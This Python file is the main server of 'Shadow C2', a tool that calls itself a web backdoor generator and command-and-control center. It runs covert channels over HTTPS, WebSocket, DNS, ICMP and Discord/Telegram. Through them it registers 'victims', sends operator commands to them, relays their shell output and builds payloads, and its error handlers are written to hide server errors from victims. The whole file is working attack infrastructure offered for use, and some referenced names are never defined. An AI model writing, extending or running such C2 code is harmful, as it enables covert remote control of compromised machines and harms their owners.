#!/usr/bin/env python3
"""
Shadow C2 — Web Backdoor Generator & Command Center
Main Application Entry Point
"""

import os
import sys
import logging
import threading
import time

from flask import Flask
from flask_socketio import SocketIO, emit, join_room, leave_room

from server.config import (
    C2_HOST, C2_PORT, SECRET_KEY, DATABASE_PATH, MASTER_KEY,
    SSL_CERT_PATH, SSL_KEY_PATH, DEBUG, LOG_LEVEL, LOG_FILE,
    DNS_ENABLED, DNS_PORT, DNS_DOMAIN, ICMP_ENABLED,
    DISCORD_ENABLED, TELEGRAM_ENABLED,
)
from server.database import DatabaseManager
from server.c2.crypto import C2Crypto
from server.c2.handler import C2Handler
from server.c2.channels.https_channel import HTTPSChannel
from server.c2.channels.ws_channel import WebSocketChannel
from server.generator.engine import PayloadGenerator

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------
logging.basicConfig(
    level=getattr(logging, LOG_LEVEL, logging.INFO),
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler(LOG_FILE, mode='a'),
    ]
)
logger = logging.getLogger("shadow_c2")

# ---------------------------------------------------------------------------
# Flask app
# ---------------------------------------------------------------------------
app = Flask(__name__,
            template_folder=os.path.join(os.path.dirname(os.path.dirname(__file__)),
                                         'frontend', 'templates'),
            static_folder=os.path.join(os.path.dirname(os.path.dirname(__file__)),
                                       'frontend', 'static'))

app.secret_key = SECRET_KEY
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  # 50MB

# ---------------------------------------------------------------------------
# SocketIO
# ---------------------------------------------------------------------------
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading',
                    ping_timeout=60, ping_interval=25)

# ---------------------------------------------------------------------------
# Initialize core components
# ---------------------------------------------------------------------------
db = DatabaseManager()
db.init_db()
logger.info(f"Database initialized: {DATABASE_PATH}")

crypto = C2Crypto(MASTER_KEY)
handler = C2Handler(db, crypto)
generator = PayloadGenerator()

# Channels
https_channel = HTTPSChannel()
https_channel.start()
handler.register_channel("https", https_channel)

ws_channel = WebSocketChannel()
ws_channel.start()
handler.register_channel("websocket", ws_channel)

# DNS channel (optional)
if DNS_ENABLED:
    try:
        from server.c2.channels.dns_channel import DNSChannel
        dns_channel = DNSChannel(port=DNS_PORT, domain=DNS_DOMAIN)
        dns_channel.start()
        handler.register_channel("dns", dns_channel)
    except Exception as e:
        logger.warning(f"DNS channel failed to start: {e}")

# ICMP channel (optional, needs root)
if ICMP_ENABLED:
    try:
        from server.c2.channels.icmp_channel import ICMPChannel
        icmp_channel = ICMPChannel()
        icmp_channel.start()
        handler.register_channel("icmp", icmp_channel)
    except Exception as e:
        logger.warning(f"ICMP channel failed to start: {e}")

# Social media channel (optional)
if DISCORD_ENABLED or TELEGRAM_ENABLED:
    try:
        from server.c2.channels.social_channel import SocialMediaChannel
        social_channel = SocialMediaChannel()
        social_channel.start()
        handler.register_channel("social", social_channel)
    except Exception as e:
        logger.warning(f"Social channel failed to start: {e}")

# Store in app config for access from routes
app.config["DATABASE"] = db
app.config["C2_HANDLER"] = handler
app.config["C2_CRYPTO"] = crypto
app.config["GENERATOR"] = generator
app.config["SOCKETIO"] = socketio
app.config["WS_CHANNEL"] = ws_channel

# ---------------------------------------------------------------------------
# Register blueprints
# ---------------------------------------------------------------------------
from server.routes.api import api_bp
from server.routes.dashboard import dash_bp

app.register_blueprint(api_bp)
app.register_blueprint(dash_bp)

# Root redirect
@app.route('/')
def root():
    from flask import redirect, url_for
    return redirect(url_for('dashboard.login'))

# ---------------------------------------------------------------------------
# SocketIO event handlers
# ---------------------------------------------------------------------------

# Dashboard namespace
@socketio.on('connect', namespace='/dashboard')
def dashboard_connect():
    from flask import session
    if not session.get('authenticated'):
        return False
    ws_channel.register_operator(request.sid if hasattr(request, 'sid') else 'unknown')
    logger.info("Operator connected to dashboard WS")

@socketio.on('disconnect', namespace='/dashboard')
def dashboard_disconnect():
    ws_channel.unregister_operator(request.sid if hasattr(request, 'sid') else 'unknown')

@socketio.on('send_command', namespace='/dashboard')
def handle_send_command(data):
    victim_id = data.get('victim_id')
    command = data.get('command', '')
    if victim_id and command:
        victim = db.get_victim(victim_id)
        if victim:
            cmd_id = handler.queue_command(victim['uuid'], command)
            emit('command_queued', {
                'victim_id': victim_id,
                'command': command,
                'command_id': cmd_id,
            })

@socketio.on('request_victims', namespace='/dashboard')
def handle_request_victims():
    victims = db.list_victims()
    emit('victim_list', {'victims': victims})

@socketio.on('request_stats', namespace='/dashboard')
def handle_request_stats():
    emit('stats_update', db.get_stats())

# C2 namespace (for victim WebSocket connections)
@socketio.on('connect', namespace='/c2')
def c2_connect():
    logger.info("C2 WebSocket connection from victim")

@socketio.on('register', namespace='/c2')
def c2_register(data):
    uuid = data.get('uuid', '')
    if uuid:
        ws_channel.register_victim(uuid, request.sid if hasattr(request, 'sid') else '')
        handler.handle_registration(data, request.remote_addr)
        join_room(uuid)

@socketio.on('beacon', namespace='/c2')
def c2_beacon(data):
    uuid = data.get('uuid', '')
    if uuid:
        ws_channel.update_ping(uuid)
        result = handler.handle_beacon(data)
        emit('tasks', result)

@socketio.on('result', namespace='/c2')
def c2_result(data):
    handler.handle_result(data)
    # Forward to dashboard
    socketio.emit('command_result', data, namespace='/dashboard')

@socketio.on('shell_output', namespace='/c2')
def c2_shell_output(data):
    socketio.emit('shell_output', data, namespace='/dashboard')

@socketio.on('disconnect', namespace='/c2')
def c2_disconnect():
    ws_channel.unregister_victim(sid=request.sid if hasattr(request, 'sid') else '')

# ---------------------------------------------------------------------------
# Background tasks
# ---------------------------------------------------------------------------

def background_tasks():
    """Run periodic maintenance tasks."""
    while True:
        try:
            time.sleep(300)  # Every 5 minutes
            handler.cleanup_dead_victims()
            crypto.auto_rotate_all()

            # Push stats to dashboard
            stats = db.get_stats()
            socketio.emit('stats_update', stats, namespace='/dashboard')
        except Exception as e:
            logger.error(f"Background task error: {e}")

bg_thread = threading.Thread(target=background_tasks, daemon=True)
bg_thread.start()

# ---------------------------------------------------------------------------
# SSL cert generation
# ---------------------------------------------------------------------------

def ensure_ssl():
    """Generate self-signed cert if not exists."""
    if not os.path.exists(SSL_CERT_PATH) or not os.path.exists(SSL_KEY_PATH):
        from server.utils.crypto_utils import generate_self_signed_cert
        logger.info("Generating self-signed SSL certificate...")
        generate_self_signed_cert("shadowc2.local", SSL_CERT_PATH, SSL_KEY_PATH)
        logger.info(f"SSL cert saved to {SSL_CERT_PATH}")

# ---------------------------------------------------------------------------
# Error handlers
# ---------------------------------------------------------------------------

@app.errorhandler(404)
def not_found(e):
    if request.path.startswith('/api/'):
        return {'status': 'not found'}, 200  # Don't reveal 404 to victims
    return '<h1>404 — Not Found</h1>', 404

@app.errorhandler(500)
def server_error(e):
    if request.path.startswith('/api/'):
        return {'status': 'ok'}, 200
    return '<h1>500 — Server Error</h1>', 500

# ---------------------------------------------------------------------------
# CORS for API
# ---------------------------------------------------------------------------

@app.after_request
def add_headers(resp):
    if request.path.startswith('/api/'):
        resp.headers['Access-Control-Allow-Origin'] = '*'
        resp.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
        resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
    return resp

# ---------------------------------------------------------------------------
# Startup banner
# ---------------------------------------------------------------------------

BANNER = r"""
   _____ __              __                 ______ ___
  / ___// /_  ____ _____/ /___ _      __   / ____/|__ \
  \__ \/ __ \/ __ `/ __  / __ \ | /| / /  / /     __/ /
 ___/ / / / / /_/ / /_/ / /_/ / |/ |/ /  / /___  / __/
/____/_/ /_/\__,_/\__,_/\____/|__/|__/   \____/ /____/

 Web Backdoor Generator & C2 Command Center
"""

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

if __name__ == '__main__':
    print(BANNER)
    print(f"  [*] Server:     https://{C2_HOST}:{C2_PORT}")
    print(f"  [*] Dashboard:  https://localhost:{C2_PORT}/dashboard/")
    print(f"  [*] API:        https://localhost:{C2_PORT}/api/")
    print(f"  [*] Database:   {DATABASE_PATH}")
    print(f"  [*] Payloads:   {os.path.join(os.path.dirname(os.path.dirname(__file__)), 'payloads')}")
    print(f"  [*] Channels:   HTTPS{'  DNS' if DNS_ENABLED else ''}{'  ICMP' if ICMP_ENABLED else ''}  WebSocket")
    print(f"  [*] Auth:       {OPERATOR_USERNAME} / {'*' * len(OPERATOR_PASSWORD)}")
    print(f"  {'='*55}")
    print()

    ensure_ssl()

    socketio.run(
        app,
        host=C2_HOST,
        port=C2_PORT,
        debug=DEBUG,
        ssl_context=(SSL_CERT_PATH, SSL_KEY_PATH) if os.path.exists(SSL_CERT_PATH) else None,
        allow_unsafe_werkzeug=True,
    )
